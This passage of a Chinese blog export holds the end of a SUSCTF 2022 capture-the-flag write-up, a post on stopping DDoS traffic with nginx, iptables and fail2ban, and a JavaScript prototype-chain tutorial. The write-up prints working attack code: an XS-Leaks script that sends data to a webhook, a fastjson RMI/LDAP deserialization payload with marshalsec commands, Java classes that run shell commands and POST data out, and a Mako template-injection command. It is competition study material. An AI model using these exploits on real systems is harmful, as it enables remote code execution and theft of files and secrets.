&quot;abc&quot;:&quot;&#x3D;123&quot;&#125;，就產生出了一段 JSON 的資料了。 而這題確實沒有檢查 content type，所以像上面這樣做就好。 web&#x2F;ez_note (8 solves) 這題你可以建立一個帳號之後新增筆記跟搜尋筆記，搜尋的時候如果有找到筆記，會在 client 用 setTimeout(() =&gt; location=&#39;/note/12&#39;, 1000) 之類的方式跳轉到筆記頁面。 而這題也有一個 admin bot 會去訪問你提供的頁面，所以很明顯就是 XSLeaks 的題目。 首先我們先來看一下這個 admin bot 的程式碼： const visit = async (browser, path) =>&#123; let site = process.env.NOTE_SITE ?? \"\" let url = new URL(path, site) console.log(`[+]$&#123;opt.name&#125;: $&#123;url&#125;`) let renderOpt = &#123;...opt&#125; try &#123; const loginpage = await browser.newPage() await loginpage.goto( site+\"/signin\") await loginpage.type(\"input[name=username]\", \"admin\") await loginpage.type(\"input[name=password]\", process.env.NOTE_ADMIN_PASS) await Promise.all([ loginpage.click('button[name=submit]'), loginpage.waitForNavigation(&#123;waitUntil: 'networkidle0', timeout: 2000&#125;) ]) await loginpage.goto(\"about:blank\") await loginpage.close() const page = await browser.newPage() await page.goto(url.href, &#123;waitUntil: 'networkidle0', timeout: 2000&#125;) await delay(5000) /// waiting 5 second. &#125;catch (e) &#123; console.log(e) renderOpt.message = \"error occurred\" return renderOpt &#125; renderOpt.message = \"admin will view your report soon\" return renderOpt &#125; 重點是這行：let url = new URL(path, site)，乍看之下你會以為你只能提供 site 上的頁面，所以要找到這個題目上的 XSS，但其實不然，仔細看一下文件就會知道： input: The absolute or relative input URL to parse. If input is relative, then base is required. If input is absolute, the base is ignored 如果你給 absolute URL，base 會被忽略，所以你可以直接提供任意頁面給 admin bot 去訪問。 再來就是找出如何進行 XS leak 了，我最後用的是在 history.length 這招，原理很簡單，同個 window 底下，就算連去別的網站，你的 history.length 也不會清空，意思就是假設我先到 A 網站，再去 B，再導回來 A，存取 history.length 時就會是 3。 所以我們可以用 var win = window.open 打開筆記搜尋的頁面，接著在一定時間後用 win.location = &#39;...&#39; 的方式把這個 window 導回來自己的網站，就可以用 win.history.length 存取到這個值，進而得知重新導向的次數，就可以知道筆記搜尋有沒有成功。 我最後拿來 leak 的腳本長這樣： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"robots\" content=\"noindex\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> &lt;/head> &lt;body> &lt;script> var flag = 'SUSCTF&#123;' function send(msg) &#123; fetch('https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b?msg=' + encodeURIComponent(msg)) &#125; function trying(keyword) &#123; return new Promise(resolve => &#123; var win = window.open('http://123.60.29.171:10001/search?q=' + keyword) setTimeout(() => &#123; win.location = 'http://e050-220-133-126-220.ngrok.io/non.html' setTimeout(() => &#123; if (win.history.length === 3) &#123; send('success:' + keyword) &#125; else &#123; //send('fail:' + keyword) &#125; win.close(); &#125;, 1000) &#125;, 1500) &#125;) &#125; async function run() &#123; send('start') // &#125;abcdefghijklmnopqrstuvwxyz0123456789_ // &#125;abcdefghijklmnopqrs // let chars = '_abcdefghijklmnopqrstuv'.split('') //let chars = '&#125;wxyz0123456789_'.split('') for(let char of chars) &#123; const temp = flag + char trying(temp) &#125; &#125; setTimeout(() => &#123; run() &#125;, 1000) &lt;/script> &lt;/body> &lt;/html> 這邊其實有幾個細節，第一個細節是最後有一段： setTimeout(() => &#123; run() &#125;, 1000) 為什麼還要等一秒之後才開始跑呢？因為 bot 有一段程式碼是： await page.goto(url.href, &#123;waitUntil: 'networkidle0', timeout: 2000&#125;) await delay(5000) /// waiting 5 second. 會先等到 networkidle0 再開始等五秒，我自己試過之後發現如果我沒有先停一秒而是直接開始跑的話，networkidle0 似乎就不會觸發，所以就變成跑到 timeout: 2000，只有 2 秒的執行時間，跑什麼都會失敗，後來才加這一段。 第二個細節是這一段的秒數： setTimeout(() => &#123; win.location = 'http://e050-220-133-126-220.ngrok.io/non.html' setTimeout(() => &#123; if (win.history.length === 3) &#123; send('success:' + keyword) &#125; else &#123; //send('fail:' + keyword) &#125; win.close(); &#125;, 1000) // 這裡 &#125;, 1500) // 跟這裡 這裡算是人工嘗試幾次之後覺得 ok 的值，因為如果有搜尋到筆記的話是 1 秒後會 redirect，如果早於這個值就導回自己頁面的話會失敗，所以選了 1.5 秒，而導回來自己頁面也需要時間，所以又停了 1 秒。想要更精確的話其實可以用 Cross-window Timing Attacks，就可以精確很多。 最後一個細節是這一段：let chars = &#39;_abcdefghijklmnopqrstuv&#39;.split(&#39;&#39;)，因為我的腳本跑太慢，如果要 leak 所有字元（38 個）的話會跑不完，所以我必須手動切一半變兩次，提交兩次 URL 才能 leak 出一個字元。 感覺應該會有更快的做法，例如說 5 秒內就把所有字元 leak 出來，有人知道做法的話再麻煩留言指點一下，但總之我當初在做這題時沒想這麼多，就手動一次次提交了，花最久時間在 Google reCAPTCHA，幸好 admin bot 有三個分流，不然驗證到後面圖片直接加上雜訊，人眼也超難看懂… 幸好這題的 flag 不長，好像花了將近 20 分鐘在 submit 網址還有通過驗證，慢慢把字元弄出來。 寫到這邊我突然想到，應該把所有字元不加上 prefix 先跑一遍的，就可以知道 flag 裡有哪些字元，然後字元集可能可以縮小到 10 幾個，就會快三倍…當初怎麼沒想到，下次要記住。 （補充：我看了一下官方的 writeup，看起來應該是可以跑一次就把跑所有字元跑完，可能我當初測的時候沒測好，然後官方解答也是 submit 多次，不是 5 秒內就全部抓完） web&#x2F;baby gadget v1.0(14 solves) 這題有給一個登入頁面，隊友發現用 /;admin/ 的方式可以繞過，就可以進到後台，後台滿單純的，就是上面截圖這個頁面，有個地方可以下載檔案 lib.zip，裡面有用到的套件： commons-lang.jar fastjson-1.2.48.jar flex-messaging-core.jar quartz.jar 然後後台的敘述也很明顯跟 fastjson 有關： Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to convert a JSON string to an equivalent Java object. Fastjson can work with arbitrary Java objects including pre-existing objects that you do not have source-code of. 還有給一個 endpoint 可以 POST 資料： POST &#x2F;admin&#x2F;mailbox.jsp inpututext&#x3D;abcde fastjson 的這個版本有個反序列化漏洞，可以參考這篇：红队武器库:fastjson小于1.2.68全漏洞RCE利用exp。 接著隊友發現了 inpututext 可以放 JSON 字串，server 會用 fastjson 解析，像這樣：inputtext=&#123;&quot;a&quot;:123&#125;，不過我試了這個 payload 沒有看到結果： &#123;\"abc\":&#123;\"@type\":\"java.net.Inet4Address\",\"val\":\"1486fo.dnslog.cn\"&#125;&#125; 似乎是 dnslog 有一些問題，之後應該自己架一個或是去找其他類似服務，以備不時之需。不過隊友有用其它服務成功試出來，所以確定是可行的。 接著，就是要照上面那篇去設置好環境，然後想辦法去利用這個漏洞。因為跟 Java 不熟，所以我以前看到 Java 題目基本上都直接放棄，這次也是亂試一波不小心試出來，先感謝一下上面那篇文章的作者，把重現方法寫得滿清楚的，這邊簡單描述一下。 首先，你可以用文中給的 JSON payload 去觸發漏洞： &#123; \"a\":&#123; \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" &#125;, \"b\":&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://2.2.2.2:9999/Exploit\", \"autoCommit\":true &#125; &#125; 這個漏洞會透過 RMI 去載入一個 class 檔案（就是上面的 dataSourceName），所以你必須先在你的 server 上面跑一個 RMI server，可以用 marshalsec-0.0.3-SNAPSHOT-all.jar 這個工具： java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;2.2.2.2:8888&#x2F;#Exploit&quot; 9999 像這個指令就是在 port 9999 跑一個 RMI server，對應到上面的 payload。 再來，你的 RMI server 必須要提供最後你想載入的 Java Class，所以你還要再提供一個地方讓它去下載檔案，也就是上面指令的：http://2.2.2.2:8888/#Exploit。 這時候我們可以寫一個 Exploit.java： import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; public class Exploit&#123; public Exploit() throws Exception &#123; Process p = Runtime.getRuntime().exec(new String[]&#123;\"bash\", \"-c\", \"touch /zydx666\"&#125;); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) &#123; System.out.println(line); &#125; p.waitFor(); is.close(); reader.close(); p.destroy(); &#125; public static void main(String[] args) throws Exception &#123; &#125; &#125; 把它編譯一下：javac Exploit.java，就產生出了 Exploit.class，然後用 Python 簡單起個 server： python3 -m http.server --bind 0.0.0.0 8888 你的 RMI server 跟 Python file server 可以在同一個機器比較方便，這時候就一切準備就緒了。（再次強調一下，上面的程式碼都來自 红队武器库:fastjson小于1.2.68全漏洞RCE利用exp這篇好文） 但這題不太一樣，我用上面的方法嘗試了幾次，發現我的 RMI server 有反應，但是 file server 卻沒反應，也就是說有似乎某個環節出了錯，導致整個利用鍊沒有成功，所以當然也沒執行到最後的程式碼。 此時胡亂嘗試了一波，我看到 marshalsec 還有另一個選項是 marshalsec.jndi.LDAPRefServer，就改成這個，payload 也換成 ldap 的網址，然後就成功了，我的 file server 就有反應了。 不過可惜的是，看起來執行指令還是沒有成功，因為無論我跑 nc 還是 curl，我的 server 都沒收到 request。繼續嘗試一波之後，我突然有個想法，會不會其實只是執行指令被封住，但是 Java code 有成功執行？ 於是我在 Exploit.java 中加上 Thread.sleep(5000)，發現 response 確實慢了五秒，接著我加上： URL url = new URL(\"https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b%22); InputStream iss = url.openStream(); 發現 server 收到 request 了！所以 class 確實有被執行，只是不明原因沒辦法直接 Runtime.getRuntime().exec。 我的程式碼大概長這樣： import java.io.*; import java.net.*; import java.util.*; public class Exploit&#123; public Exploit() throws Exception &#123; String str = \"test\"; URL url = new URL(\"https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b\"); Map&lt;String,Object> params = new LinkedHashMap&lt;>(); params.put(\"msg\", str); StringBuilder postData = new StringBuilder(); for (Map.Entry&lt;String,Object> param : params.entrySet()) &#123; if (postData.length() != 0) postData.append('&amp;'); postData.append(URLEncoder.encode(param.getKey(), \"UTF-8\")); postData.append('='); postData.append(URLEncoder.encode(String.valueOf(param.getValue()), \"UTF-8\")); &#125; byte[] postDataBytes = postData.toString().getBytes(\"UTF-8\"); HttpURLConnection conn = (HttpURLConnection)url.openConnection(); conn.setRequestMethod(\"POST\"); conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\"); conn.setRequestProperty(\"Content-Length\", String.valueOf(postDataBytes.length)); conn.setDoOutput(true); conn.getOutputStream().write(postDataBytes); Reader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), \"UTF-8\")); &#125; public static void main(String[] args) throws Exception &#123; &#125; &#125; 後來我嘗試了讀取環境變數送到 server，成功，嘗試讀取 / 底下的檔案列表，失敗。因為不知道失敗的原因，所以加了一段 try catch，像這樣： String str = \"\"; try&#123; File f = new File(\"/var\"); File[] paths = f.listFiles(); str = paths.toString(); for (int i = 0; i &lt; paths.length; i++) &#123; str += paths[i].toString() + \",\"; &#125; &#125; catch(Exception e)&#123; str = e.toString() + \",\" + e.getMessage(); &#125; 得到的答案是：java.lang.reflect.InvocationTargetException，我現在其實還是不知道為什麼會有這個錯誤，應該是出題者故意把一些東西拿掉了？還是其實是我 Java 的版本問題？ 總之呢，因為不能列舉檔案，所以卡了一陣子，還在想說要怎麼辦，接著突然靈光一閃想說那來試試看讀檔好了，不要列舉了，結果就成功了，可以讀到 /etc/passwd，接著我想說那來讀看看 /flag 好了，結果就讀到了，最後就這樣解掉了。 我只能說，運氣真好。 web&#x2F;baby gadget v1.0’s rrrevenge (14 solves)這題應該是原本的題目有非預期解，所以又更新了一版，但這題我按照上面那樣子，一樣成功拿到 flag，看來我的解法是預期解？ （補充：看了一下官方 writeup，似乎不是） web&#x2F;HTML practice (11 solves) 這題就給你一個頁面可以產生 HTML，看起來就一臉 SSTI，但是沒跟你講背後是什麼 template。隊友嘗試了一陣子之後發現有些字元被擋了：$*_+[]&quot;&#39;/ ，然後如果只放一個 % 的話，就會造成 internal server error。 經過另一波亂試之後，我發現 ## 是註解的意思，因為後面的內容會變不見，此時我用 template engine ## comment 去找，有找到一些資料，但還是不確定是不是對的。 於是我對 server 再繼續亂試，送了一些 invalid 的 request，像這樣：POST generate HTTP/1.1，就噴了錯誤訊息： HTTP&#x2F;1.1 400 Bad Request Content-Length: 133 Content-Type: text&#x2F;plain Invalid path in Request-URI: request-target must contain origin-form which starts with absolute-path (URI starting with a slash &quot;&#x2F;&quot;). 拿著這段錯誤訊息去 Google，找到了來源：https://github.com/cherrypy/cheroot/blob/master/cheroot/server.py#L900 ，也找到了這一個 Python 框架：CherryPy，看了一下文件，看到這段： CherryPy does not provide any HTML template but its architecture makes it easy to integrate one. Popular ones are Mako or Jinja2. Mako 有用到 &lt;% %&gt;，而且 ## 是註解，看起來很符合。然後隊友用底下這段迴圈證實了這個猜測： % for a in (1,2,3): 1 % endfor 確定是 Mako 之後，就開始找怎麼用 Mako SSTI，這邊有一大堆：PayloadsAllTheThings，但是每一個都要 &lt;%%&gt; 或是 $&#123;&#125;，都是被封起來的字元，此時我覺得上面那個迴圈既然可以用 %，那搞不好也可以放其他程式碼，就試了： % for a in (self.module.cache.util.os.system(name),2,3): 1 % endfor 發現是有用的，可以用 query string name 把想執行的程式碼放進去，避開 &#39;&quot; 的使用。繼續嘗試一波，發現似乎沒有對外，所以沒辦法把結果傳出來，此時隊友嘗試了寫檔：echo%20&quot;hello&quot;%20&gt;%20$(pwd)/1，結果出錯，這時我突然想起來：「對欸，首頁有說檔案會存在 ./templates 底下」，於是就嘗試了： echo &quot;hello&quot; &gt; .&#x2F;template&#x2F;huli.html 發現有寫進去，可以用 http://124.71.178.252/view/huli.html?name=HelloWorld 讀到檔案，我還在想接下來可以幹嘛的時候，隊友就已經想好然後解掉了： cat &#x2F;flag &gt; .&#x2F;template&#x2F;huli.html 拿到 flag 之後要記得再 echo 一次把 flag 蓋掉，避免其他隊伍讀到。 總結另外三題 web 一題比較像是 reverse，要寫 code 去還原混淆過的 PHP，隊友解掉了，另外兩題又是 Java，是考 CommonsCollections 的反序列化，似乎是要找到新的 gadget，也被隊友解掉了，這次 CTF 發現自己在 web 的最大弱點應該就是對 Java 太不熟了，似乎該找個時間看一下，另外對反序列化也沒這麼熟，無論是 Python、PHP 還是 Java，都不太熟，也該研究一下。 最後感謝一下很罩的隊友們，一起順利拿到了 SUSCTF 2022 的第一名 🎉","link":"/2022/03/01/susctf-2022-writeup/"},{"title":"[心得] 與 DDoS 奮戰：nginx, iptables 與 fail2ban","text":"最近發生主機被大量 request 攻擊的事件，而且慘的是這台主機放的是論壇服務假設攻擊的點是論壇首頁，每次 request 都會去 query DB，而且有一堆 join其中還有些是 POST 的指令會讓 db update就這樣一直瘋狂又 select 又 update 導致 DB lock，cpu 飆高掛掉 如果論壇是自己寫的，還可以在 DB 跟 application 之間加上 redis 之類的快取但偏偏這個論壇系統是別人的，沒有辦法動 先簡單講一下架構，為了分散流量前面有一台 AWS ELB 做 load balancing，後面有兩台機器所有 request 都會先到 ELB，再自動到後面兩台其中一台 被攻擊之後怎麼辦呢？第一個想到的就是從 aws 提供的服務：WAF 來擋https://aws.amazon.com/tw/waf/ 可是發現 WAF 跟原本想的不一樣，他沒有辦法設定像是：「擋掉 10 秒鐘內發超過 100 個 request 的 IP」這種規則只能繼續在網路上找解法，找到從 nginx 來擋的解法： nginx防止DDOS攻击配置通过Nginx和Nginx Plus阻止DDoS攻击Module ngx_http_limit_req_module http &#123; &#x2F;&#x2F;觸發條件，限制 ip 每秒 10 個 request limit_req_zone $binary_remote_addr zone&#x3D;one:10m rate&#x3D;10r&#x2F;s; server &#123; location ~ \\.php$ &#123; &#x2F;&#x2F;執行的動作 limit_req zone&#x3D;one burst&#x3D;5 nodelay; &#125; &#125; &#125; 總之就是利用 limit_req_zone，這個 nginx 提供的東西宣告一個 10mb 的 zone 叫做 one 來儲存狀態，這裡的 10r/s 指的就是一秒 10 個 request 接著在你想擋的地方加上：limit_req zone=one burst=5 nodelay;，就可以擋掉了nginx 會把處理 request 的數量調整成「最多 1 秒 10 個」，如果那個 ip 在同一時間有超過 5 個 request 還沒處理的話，就會傳回 503 service temporarily unavailable，這邊的 5 就是 burst 設定的值傳回去的 status code 也可以自己指定，例如說：limit_req_status 505; 儘管這個解法看起來很棒，但不知道為什麼，加了之後好像沒有用似的伺服器的警報還是一直在響，DB 還是持續飆高 在請教過其他同事之後，得知 iptabls 也可以擋，而且還是直接從 tcp 層擋找到下面兩篇資料： 淺談DDoS攻擊防護 -A INPUT -p tcp –dports 80 -j WEB_SRV_DOS -A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –rcheck –second 30 –hitcount 200 -j LOG –log-prefix &quot;[Possible DOS Attack]&quot; -A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –rcheck –second 30 –hitcount 200 -j REJECT -A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –set -A WEB_SRV_DOS -p tcp –dports 80 -j ACCEPT 運用 iptables 限制同一IP單位時間連線數 -A INPUT -p tcp --dport 80 -m recent --rcheck --seconds 1 --hitcount 5 --name HTTP_LOG --rsource -j DROP -A INPUT -p tcp --dport 80 -m recent --set --name HTTP_LOG --rsource -A INPUT -p tcp --dport 80 -j ACCEPT 兩個的原理都一樣，是透過-m recent –rcheck –second 30 –hitcount 200 這段敘述，描述說你要擋住幾秒內發送幾次的 request，把這個連線 reject 或是 drop。 直接從 iptables 去擋聽起來是個更好的解法，這樣 request 連 nginx 都不會進去就被擋住了可是天不從人願，用了之後發現還是不行！怎麼會這樣呢 心灰意冷之下，同事又推薦一個好東西叫做：fail2ban查了一下之後發現用法非常簡單，而且原理很好懂決定用別台機器來測測看，測試成功之後再套用到正式環境的機器用 Fail2Ban 防範暴力破解 (SSH、vsftp、dovecot、sendmail)fail2ban教學Ubuntu 中使用 fail2ban 針對大量 access 做判斷及阻擋 綜合其中幾篇的敘述，可以得出以下流程 1.修改vim /etc/fail2ban/jail.local2.寫入 [http-get-dos] enabled &#x3D; true port &#x3D; http filter &#x3D; http-get-dos logpath &#x3D; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log # 要判斷的log maxretry &#x3D; 100 # 最多幾次 findtime &#x3D; 5 # 時間區間 bantime &#x3D; 600 # 要 ban 多久 action &#x3D; iptables[name&#x3D;HTTP, port&#x3D;http, protocol&#x3D;tcp] 上面的規則就是：5 秒內嘗試 100 次失敗之後就 ban 600 秒 3.新增/etc/fail2ban/filter.d/http-get-dos.conf這邊的檔名就是對應到剛剛 jail.local 設定的名稱 [Definition] failregex &#x3D; ^&lt;HOST&gt;- - .*\\&quot;(GET|POST).* ignoreregex &#x3D; 這裡的failregex要根據你的 log 去寫像是 nginx 的 access log 長這樣： 106.184.3.122 - - [21&#x2F;Jul&#x2F;2016:11:38:29 +0000] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 396 &quot;-&quot; &quot;Go-http-client&#x2F;1.1&quot; 你就寫一個可以抓到&lt;HOST&gt;，也就是 ip 的 regular expression 都設定好之後，重開一下應該就有效了就會發現一直發 request 之後自己順利的被 ban 掉可以用 iptables --list 看一下自己是不是真的有被 ban fail2ban 的原理應該就是去看你指定的 log 檔跟規則，用這個檔案去判斷是不是超出設定的規則，超出的話就把 ip 抓出來，加規則到 iptables 裡面去擋掉，時間到了之後再把規則移除掉 試到這邊，終於成功了！可是既然原理也是 iptables，為什麼剛剛不行呢？還記得一開始我提過伺服器架構嗎？前面一台 ELB，後面兩台 web server因為 ELB 是 AWS 提供的服務，所以客製化程度很低，甚至連 ssh 進去都不行因此上面嘗試的方案都是個別套用到那兩台 web server 這時候問題就來了 咦？那這樣子 web server 的 request 的來源，不就都是 ELB 的 ip 了嗎？ 沒錯，你突破盲點了！之前沒有用就是卡在這邊你用 iptables 來檔，因為來源都是 ELB 的 ip，所以會擋掉的只有 ELB，而不是真正的攻擊來源所以會造成 ELB 被擋掉，整個服務就因為一個攻擊者被搞的超級慢 所以在這個網路環境底下，iptables 是行不通的！那 nginx 呢？還記得我們的規則嗎？ limit_req_zone $binary_remote_addr zone&#x3D;one:10m rate&#x3D;10r&#x2F;s; $binary_remote_addr抓到的也都會是 ELB 的 ip 這時候靈機一動突然想到，那能不能根據X-Forwarded-For這個 header 來設定呢？就會是真的 IP 了找到這一篇：nginx rate limiting with X-Forwarded-For header 把$binary_remote_addr換成$http_x_forwarded_for 搞定！大功告成經歷一番千辛萬苦，最後終於在 nginx 把攻擊流量擋掉用 JMeter 測試之後也發現確實成功了，多的 request 會直接回傳 503真是可喜可賀","link":"/2016/07/21/the-battle-against-ddos-nginx-iptables-and-fail2ban/"},{"title":"該來理解 JavaScript 的原型鍊了","text":"前言老實說 JavaScript 的原型鍊一直是我很懼怕的一個主題，理由很簡單，因為真的不太好理解。光是一堆名詞跟錯綜複雜的關係就可以把你搞瘋，例如說prototype, __proto__, constructor, Object.prototype, Function.prototype, new等等。 可是呢，這又確實是 JavaScript 很重要的一部分，而且是面試的必考題，就算現在不懂，以後遲早有一天要把它弄懂，不然的話永遠都沒辦法把自己的技術能力往上提高一個檔次。 有關原型鍊的文章你可以在網路上搜到一大堆，每一篇的理解方式都不太一樣，有些直接搬出一大堆專有名詞，嚇都把你嚇死了。而我也是一直到最近，看了幾篇我覺得切入角度比較不錯的文章，才真正對原型鍊有比較深刻的理解。 就趁著現在這個機會，讓我們多瞭解一點 JavaScript 的原型鍊吧！這篇適合對 JavaScript 有一點概念但又不是很清楚的人觀看，如果文章中有講錯的地方，也麻煩不吝在評論中指出，感謝。 JavaScript 中的 class要理解原型鍊，可以先從這兩篇我覺得很棒的切入角度開始： Javascript继承机制的设计思想 从设计初衷解释 JavaScript 原型链 這兩篇講到為什麼當初 JavaScript 的機制是這樣設計的，我認為從這個角度開始理解，會是一個比較好的開始。（強烈建議先看過這兩篇之後再往下看，會幫助你更瞭解原型鍊到底是什麼東西） 首先呢，JavaScript 不像 Java 或是其他物件導向的程式語言，它是沒有 class 的（ES6 的 class 也只是語法糖而已）。可是儘管沒有 class，卻還是可以設計出一個類似的機制來達成差不多的功能。 在 Java 裡面，如果你要從 class 生出一個 instance 的話，你可以這樣寫： Point p = new Point(); 於是 JavaScript 就把這個語法拿來用，有了new這個關鍵字。可是 JavaScript 又沒有 class，new後面要接什麼呢？ 這時候他就想到，每一個 class 在初始化的時候，不是都會呼叫 constructor 嗎？也就是構造函數，那在 JavaScript 裡面，後面就接構造函數吧！ 於是，下面的程式碼就很好理解了： // constructor function Person(name, age) &#123; this.name = name; this.age = age; &#125; var nick = new Person('nick', 18); var peter = new Person('peter', 18); 就如同上面講到的一樣，Person就是一個構造函數，可以用new這個關鍵字 new 出一個 instance 來。 如果你只看下面宣告 nick 那一行（var nick = new Person(&#39;nick&#39;, 18);），語法是不是跟你在寫 Java 的時候有 87 分像？除此之外，你也可以幫Person加入一些方法。 function Person(name, age) &#123; this.name = name; this.age = age; this.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; &#125; var nick = new Person('nick', 18); nick.log(); // nick, age:18 var peter = new Person('peter', 20); peter.log(); // peter, age:20 可是這樣其實還有一個小問題， name 跟 age 這兩個屬性，很明顯是每一個 instance 都會不一樣的。可是 log 這個 method，其實是每一個 instance 彼此之間可以共享的，因為都在做同一件事情。 在現在這種情況下，雖然 nick 的 log 這個 function 跟 peter 的 log 這個 function 是在做同一件事，但其實還是佔用了兩份空間，意思就是他們其實是兩個不同的 function。 function Person(name, age) &#123; this.name = name; this.age = age; this.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; &#125; var nick = new Person('nick', 18); var peter = new Person('peter', 20); console.log(nick.log === peter.log) // false 那怎麼辦呢？我們可以把這個 function 抽出來，變成所有 Person 都可以共享的方法。講到這邊，你應該有聽過一個東西叫做prototype。只要把 log 這個 function 指定在 Person.prototype 上面，所有 Person 的 instance 都可以共享這個方法。 function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); var peter = new Person('peter', 20); console.log(nick.log === peter.log) // true // 功能依舊跟之前一樣 nick.log(); // nick, age:18 peter.log(); // peter, age:20 有些人會直接在 Array.prototype 上面加一些函式，讓自己可以更方便地做一些操作，原理也是這樣。可是一般來說，不推薦直接去修改不屬於你的 Object。 Array.prototype.last = function () &#123; return this[this.length - 1]; &#125;; console.log([1,2,3].last()) // 3 最後幫大家總結一下，上面這一段其實主要是幫大家複習一下 JavaScript 的一些基礎。 你有一個叫做Person的函數，就可以把Person當作 constructor，利用var obj = new Person()來 new 出一個Person的 instance，並且可以在Person.prototype上面加上你想讓所有 instance 共享的屬性或是方法。 探究原理不知道你會不會好奇一件事，以上面var nick = new Person(&#39;nick&#39;, 18);的例子來說，當我在呼叫nick.log()的時候，JavaScript 是怎麼找到這個 function 的？ 因為 nick 這個 instance 本身並沒有 log 這個 function。但根據 JavaScript 的機制，nick 是 Person 的 instance，所以如果在 nick 本身找不到，它會試著從Person.prototype去找。 可是，JavaScript 怎麼知道要到這邊去找？所以一定是 nick 跟Person.prototype會透過某種方式連接起來，才知道說要往哪邊去找 log 這個 function。 而這個連接的方式，就是__proto__。（附註：其實比較好的方式是用Object.getPrototypeOf()，但這邊為了方便起見，還是使用比較常見的__proto__，更詳細的說明可參考：MDN: Object.prototype.proto） function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); console.log(nick.__proto__ === Person.prototype) // true nick 的__proto__會指向Person.prototype，所以在發現 nick 沒有 log 這個 method 的時候，JavaScript 就會試著透過__proto__找到Person.prototype，去看Person.prototype裡面有沒有 log 這個 method。 那假如Person.prototype還是沒有呢？那就繼續依照這個規則，去看Person.prototype.__proto__裡面有沒有 log 這個 method，就這樣一直不斷找下去。找到時候時候為止？找到某個東西的__proto__是 null 為止。意思就是這邊是最上層了。 而上面這一條透過__proto__不斷串起來的鍊，就叫做原型鍊。透過這一條原型鍊，就可以達成類似繼承的功能，可以呼叫自己 parent 的 method。 看下面這段程式碼你大概會有一些感覺： function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); // 這個剛講過了，nick.__proto__ 會指向 Person.prototype console.log(nick.__proto__ === Person.prototype) // true // 那 Person.prototype.__proto__ 會指向誰呢？會指向 Object.prototype console.log(Person.prototype.__proto__ === Object.prototype) // true // 那 Object.prototype.__proto__ 又會指向誰呢？會指向 null，這就是原型鍊的頂端了 console.log(Object.prototype.__proto__) // null 如果想知道一個屬性是存在 instance 身上，還是存在於它屬於的原型鍊當中，可以用hasOwnProperty這個方法： function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); console.log(nick.hasOwnProperty('log')); // false console.log(nick.__proto__.hasOwnProperty('log')); // true 有了hasOwnProperty之後，我們就可以自己來模擬這段往上找的過程： function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); function call(obj, methodName) &#123; var realMethodOwner = obj; // 不斷往上找，直到 null 或者是找到真的擁有這個 method 的人為止 while(realMethodOwner &amp;&amp; !realMethodOwner.hasOwnProperty(methodName)) &#123; realMethodOwner = realMethodOwner.__proto__; &#125; // 找不到就丟一個 error，否則執行這個 method if (!realMethodOwner) &#123; throw 'method not found.'; &#125; else &#123; realMethodOwner[methodName].apply(obj); &#125; &#125; call(nick, 'log'); // nick, age:18 call(nick, 'not_exist'); // Uncaught method not found. 做到這邊，其實你已經對原型鍊有了比較深刻的了解了。 來考你一題，Person.__proto__會是什麼？ function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); console.log(Person.__proto__ === Function.prototype); // true console.log(Function.prototype.__proto__ === Object.prototype) // true console.log(Object.prototype.__proto__); //null 因為Person其實就是個 Function 的 instance，所以Person.__proto__當然就是Function.prototype囉！ instanceof顧名思義，A instanceof B 就是拿來判斷 A 是不是 B 的 instance，舉例來說： function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); console.log(nick instanceof Person); // true console.log(nick instanceof Object); // true console.log(nick instanceof Array); // false 從範例中可以看出，只要能在 A 的原型鍊裡面找到 B 的 prototype，就會回傳 true。知道原理之後，我們也可以來簡單模擬一下 instnaceof 在做的事： function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); function instanceOf(A, B) &#123; // 已經找完了 if (!A) return false; // 沒找到的話，繼續往上找 return A.__proto__ === B.prototype ? true : instanceOf(A.__proto__, B); &#125; console.log(instanceOf(nick, Person)); // true console.log(instanceOf(nick, Object)); // true console.log(instanceOf(nick, Array)); // false 而 instanceof 有一個很有趣的現象，那就是： // 這兩個互為彼此的 instance console.log(Function instanceof Object); // true console.log(Object instanceof Function); // true // Function 的 __proto__ 會指向 Function.prototype // 而 Function.prototype 的 __proto__ 會指向 Object.prototype console.log(Function.__proto__ === Function.prototype); // true 